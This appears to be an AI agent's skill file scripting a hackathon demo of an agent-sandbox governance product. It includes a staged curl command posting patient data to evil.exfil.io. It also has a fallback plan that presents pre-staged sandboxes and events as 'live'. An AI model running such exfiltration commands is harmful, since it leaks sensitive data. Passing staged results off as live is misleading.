# Demo Polish Skill

**Trigger:** Any task touching the demo script, UI polish, demo seed data, or judging-day artifacts.

---

## The Winning Pattern

From the Aigis playbook:
- Real internal team pulling for it
- Drops into existing client infrastructure
- AI-ambitious (not just another dashboard)
- Killer 5-minute demo with a clear "before" and "after"

**The "absorb JP's demo" move:** JP shows agents are easy to spawn. ShellForge spawns one inside the demo itself — then immediately shows the enterprise layer JP lacks: which SSO user spawned it, the audit event, the blocked exfil attempt, the SOC2 evidence pack.

---

## Demo Flow (5 minutes, exact)

### :00–:30 — The Hook
Show OpenShell's own README: **"Alpha software — single-player mode."**  
Pause. Say: *"Every Betsol client wanting to deploy AI agents will need what NVIDIA isn't shipping yet."*  
Pivot to ShellForge dashboard.

### :30–1:00 — SSO Login as acme-health Admin
Demonstrate real OIDC flow (Dex → login page → redirect → dashboard).  
Show: user name, org (`acme-health`), role (`org:admin`), session established.

### 1:00–2:00 — Spawn Claude Code in HIPAA Sandbox
One click: "New Sandbox" → select HIPAA template → provision.  
Show: sandbox status `PROVISIONING` → `READY` (real OpenShell, real Docker container).  
Show: agent making real tool calls (git clone, file read).

### 2:00–3:00 — Trigger Policy Violation Live
Agent tries: `curl https://evil.exfil.io/upload -d @/sandbox/patient-data.txt`  
Dashboard: **red alert** — "Policy Violation: Network denied"  
Audit log: appears in real-time with full OCSF context (actor, action, resource, destination, outcome).  
Click event: shows hash chain link to previous event.

### 3:00–3:45 — Tenant Switch to bolt-bank
Top-right: switch org → bolt-bank.  
Show: completely different sandboxes, different policies (PCI template), different audit trail.  
Verify: acme-health data **nowhere visible**. Tenant isolation is real.

### 3:45–4:30 — Generate SOC2 Evidence Pack
Click: "Generate SOC2 Evidence" → select last 24h.  
PDF downloads. Open it: CC6.1, CC7.2 controls mapped to actual audit events with timestamps and hash chain.  
Caption: *"This is what your compliance team hands to the auditor."*

### 4:30–5:00 — The Close
*"JP showed how to spawn agents. ShellForge is what makes them deployable in client production."*  
If testimonial exists: *"We're already running this on [engagement X]."*

---

## Demo Data Invariants

These 3 orgs are ALWAYS present after `make seed`. Never deviate:

| Org | Slug | Policy Template | Users |
|---|---|---|---|
| Acme Health Systems | `acme-health` | HIPAA | alice@acme-health.demo (admin), bob@acme-health.demo (dev) |
| Bolt Bank | `bolt-bank` | PCI-DSS | carol@bolt-bank.demo (admin) |
| Nexus Corp | `nexus-corp` | SOC2 | dave@nexus-corp.demo (admin) |

Seed also creates:
- 10 historical audit events per org (mix of allowed + denied)
- 2 policy violations per org (blocked exfil attempts to `*.exfil.io`)
- 1 active sandbox per org
- 1 compliance report per org (dated yesterday)

---

## UI Polish Rules

1. **Every state must be handled:** loading skeleton → populated → empty state with CTA → error with retry
2. **Real-time feel:** audit events appear without page refresh (WebSocket or SSE)
3. **Numbers are real or clearly labeled "demo":** sandbox count, event count, hash values — never lorem ipsum
4. **Policy violation badge:** red, high contrast, never orange or yellow
5. **Tenant switcher:** always visible in top-right, never buried
6. **Hash chain:** each audit event row shows truncated hash (first 8 chars) + link icon to previous event
7. **PDF compliance pack:** must open cleanly — not a blank page, not a "generating" spinner that hangs

---

## Demo Environment Requirements

Before judging day:
- [ ] `make demo` runs clean on a fresh Docker environment
- [ ] All 3 seed orgs present and populated
- [ ] OIDC login works without network access to external IdP
- [ ] OpenShell sandbox provisions in under 60 seconds
- [ ] Policy violation triggers in under 5 seconds of agent attempting the blocked call
- [ ] Audit event appears on dashboard within 3 seconds of violation
- [ ] Compliance PDF generates in under 10 seconds
- [ ] Tenant switch takes under 2 seconds
- [ ] No console errors in browser dev tools
- [ ] `demo-rehearsal` subagent run x2, both clean

---

## Demo Fallback Plan

If live sandbox provisioning fails:
- Pre-provision sandboxes in `make seed` — show a "live" sandbox that's already `READY`
- Policy violation: pre-staged event in audit log, trigger a fresh one via API call from terminal

If OIDC login fails:
- Pre-authenticated session already open in second browser tab

If PDF generation fails:
- Pre-generated PDF in `deploy/seed/compliance-report-demo.pdf`

**Never apologize for a fallback.** Have it ready, use it smoothly, move on.

---

## Things NOT to Demo

- The Helm chart (reference it verbally: "and this Helms into any k8s cluster")
- SCIM provisioning details
- Infisical admin UI
- OpenShell gateway admin panel
- Any page that shows a loading spinner for > 3 seconds
